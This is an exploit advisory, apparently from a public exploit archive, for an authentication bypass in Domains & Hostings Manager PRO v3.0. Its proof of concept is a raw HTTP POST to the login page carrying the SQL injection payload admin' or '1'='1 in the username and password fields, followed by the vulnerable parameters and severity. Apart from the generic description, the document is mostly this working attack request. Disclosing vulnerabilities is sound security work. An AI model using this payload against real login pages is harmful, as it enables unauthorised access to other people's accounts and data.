@@ -1,0 +1,44 @@
+# # # # # 
+# Exploit Title: Domains & Hostings Manager PRO v 3.0 - Authentication Bypass
+# Date: 13.01.2018
+# Vendor Homepage: http://endavi.com/
+# Software Buy: https://codecanyon.net/item/advanced-domains-and-hostings-pro-v3-multiuser/10368735
+# Demo: http://endavi.com/dhrpro_demo/
+# Version: 3.0
+# Tested on: Windows 10
+# # # # # 
+# Exploit Author: Tauco
+
+Description :
+While most applications require authentication to gain access to private information or to execute tasks, not every authentication method is able to provide adequate security. Negligence, ignorance, or simple understatement of security threats often result in authentication schemes that can be bypassed by simply skipping the log in page and directly calling an internal page that is supposed to be accessed only after authentication has been performed.
+In addition, it is often possible to bypass authentication measures by tampering with requests and tricking the application into thinking that the user is already authenticated. This can be accomplished either by modifying the given URL parameter, by manipulating the form, or by counterfeiting sessions. 
+
+POC
+===================================================================================================
+POST /dhrpro_demo/login.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+
+accusername=admin%27+or+%271%27%3D%271&accuserpassword=admin%27+or+%271%27%3D%271&login=+ENTER+
+
+Login = admin' or '1'='1
+Password   = admin' or '1'='1
+
+Severity Level:
+=========================================================
+High
+
+Description:
+==========================================================
+ 
+ 
+Request Method(s):              [+]  POST & GET
+ 
+ 
+Vulnerable Product:             [+]  Domains & Hostings Manager PRO v 3.0
+ 
+ 
+Vulnerable Parameter(s):        [+]  accusername, accuserpassword
